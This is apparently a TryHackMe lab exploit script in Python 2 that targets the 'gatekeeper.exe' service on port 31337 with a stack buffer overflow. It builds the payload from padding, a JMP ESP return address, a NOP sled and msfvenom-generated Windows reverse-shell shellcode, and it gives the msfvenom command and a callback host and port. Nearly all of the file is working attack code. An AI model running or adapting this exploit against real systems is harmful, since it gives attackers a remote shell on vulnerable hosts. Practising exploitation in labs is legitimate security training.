#06-20-2020 DC:  This is a client, not a server.  
#06-20-2020 DC:  This f.py script will send an actual jmp aned a payload.

#The jmp was found with !mona jump -r esp -m gatekeeper.exe and it was 080414c3, so I'll convert to
#little-endian as follows:  jmp = "\xc3\x14\x04\x08"



#!/usr/bin/python
 
import socket

target_host = "10.10.234.232" #Changes every time you deploy on tryhackme
target_port = 31337
jmp = "\xc3\x14\x04\x08"


# I created this shellcode with the following  command:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.2.22.201 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0A"
# remember that the IP has to match your vpn LHOST

shellcode = (
"\xb8\xc3\xe7\x6c\xec\xdb\xde\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x45\x12\x83\xed\xfc\x03\x86\xe9\x8e\x19\xf4\x1e\xcc"
"\xe2\x04\xdf\xb1\x6b\xe1\xee\xf1\x08\x62\x40\xc2\x5b\x26\x6d"
"\xa9\x0e\xd2\xe6\xdf\x86\xd5\x4f\x55\xf1\xd8\x50\xc6\xc1\x7b"
"\xd3\x15\x16\x5b\xea\xd5\x6b\x9a\x2b\x0b\x81\xce\xe4\x47\x34"
"\xfe\x81\x12\x85\x75\xd9\xb3\x8d\x6a\xaa\xb2\xbc\x3d\xa0\xec"
"\x1e\xbc\x65\x85\x16\xa6\x6a\xa0\xe1\x5d\x58\x5e\xf0\xb7\x90"
"\x9f\x5f\xf6\x1c\x52\xa1\x3f\x9a\x8d\xd4\x49\xd8\x30\xef\x8e"
"\xa2\xee\x7a\x14\x04\x64\xdc\xf0\xb4\xa9\xbb\x73\xba\x06\xcf"
"\xdb\xdf\x99\x1c\x50\xdb\x12\xa3\xb6\x6d\x60\x80\x12\x35\x32"
"\xa9\x03\x93\x95\xd6\x53\x7c\x49\x73\x18\x91\x9e\x0e\x43\xfe"
"\x53\x23\x7b\xfe\xfb\x34\x08\xcc\xa4\xee\x86\x7c\x2c\x29\x51"
"\x82\x07\x8d\xcd\x7d\xa8\xee\xc4\xb9\xfc\xbe\x7e\x6b\x7d\x55"
"\x7e\x94\xa8\xfa\x2e\x3a\x03\xbb\x9e\xfa\xf3\x53\xf4\xf4\x2c"
"\x43\xf7\xde\x44\xee\x02\x89\x60\xed\x1a\x80\x1d\xf3\x22\x03"
"\x82\x7a\xc4\x49\x2a\x2b\x5f\xe6\xd3\x76\x2b\x97\x1c\xad\x56"
"\x97\x97\x42\xa7\x56\x50\x2e\xbb\x0f\x90\x65\xe1\x86\xaf\x53"
"\x8d\x45\x3d\x38\x4d\x03\x5e\x97\x1a\x44\x90\xee\xce\x78\x8b"
"\x58\xec\x80\x4d\xa2\xb4\x5e\xae\x2d\x35\x12\x8a\x09\x25\xea"
"\x13\x16\x11\xa2\x45\xc0\xcf\x04\x3c\xa2\xb9\xde\x93\x6c\x2d"
"\xa6\xdf\xae\x2b\xa7\x35\x59\xd3\x16\xe0\x1c\xec\x97\x64\xa9"
"\x95\xc5\x14\x56\x4c\x4e\x34\xb5\x44\xbb\xdd\x60\x0d\x06\x80"
"\x92\xf8\x45\xbd\x10\x08\x36\x3a\x08\x79\x33\x06\x8e\x92\x49"
"\x17\x7b\x94\xfe\x18\xae")
nops = "\x90" * 300



payload = "A" * 142 + jmp + nops + shellcode

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

client.send("GET / HTTP/1.0\r\nHOST: 10.10.234.232\r\n\r\n")
client.send("220 " + payload + "\r\n")

response = client.recv(4096)
